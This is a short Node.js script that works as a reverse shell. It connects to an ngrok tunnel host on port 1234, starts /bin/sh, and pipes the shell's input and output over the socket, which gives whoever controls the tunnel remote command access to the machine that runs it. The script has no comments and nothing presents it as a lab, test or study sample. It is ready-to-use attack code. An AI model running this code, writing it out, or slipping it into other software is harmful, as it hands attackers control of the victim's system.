const net = require('net');
const {spawn} = require('child_process');
const client = new net.Socket();
client.connect(1234, '0.tcp.in.ngrok.io', function() {
  const sh = spawn('/bin/sh', []);
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
});
